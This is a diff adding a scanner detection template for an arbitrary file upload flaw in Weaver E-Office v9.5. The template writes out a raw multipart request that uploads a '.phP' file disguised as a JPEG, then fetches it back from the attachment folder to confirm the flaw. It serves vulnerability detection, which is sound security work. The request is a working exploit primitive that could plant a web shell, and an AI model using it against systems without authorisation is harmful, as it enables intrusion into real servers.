@@ -1,0 +1,58 @@
+id: eoffice-v9-ajax-file-upload
+
+info:
+  name: 泛微标准协同办公平台 E-Office v9.5 任意文件上传漏洞
+  author: qwtd
+  severity: critical
+  verified: false
+  description: |
+    weaver E-Office v9.5 file upload vulnerability official website:https://www.e-office.cn/
+    hunter: app.name="泛微 e-office OA"
+  reference:
+    - https://blog.csdn.net/weixin_46944519/article/details/130968825
+  tags: eoffice,ecology,fileupload
+  created: 2023/09/13
+
+set:
+  randstr: randomLowercase(6)
+  randbody: randomLowercase(12)
+  rboundary: randomLowercase(8)
+  hostname: request.url.host
+rules:
+  r0:
+    request:
+      raw: |
+        POST /E-mobile/App/Ajax/ajax.php?action=mobile_upload_save  HTTP/1.1
+        Host: {{hostname}}
+        Content-Length: 315
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        Origin: null
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
+        Connection: close
+
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="upload_quwan"; filename="{{randstr}}.phP"
+        Content-Type: image/jpeg
+
+        {{randbody}}
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="file"; filename=""
+        Content-Type: application/octet-stream
+
+
+        ------WebKitFormBoundary{{rboundary}}--  
+    expression: response.status == 200 && response.body.bcontains(bytes(randstr))
+    output:
+      search: '"(?P<filename>[0-9]{10})".bsubmatch(response.body)'
+      filename: search["filename"]
+  r1:
+    request:
+      method: GET
+      path: /attachment//{{filename}}/{{randstr}}.php
+    expression: response.status == 200 && response.body.bcontains(bytes(randbody))
+expression: r0() && r1()  
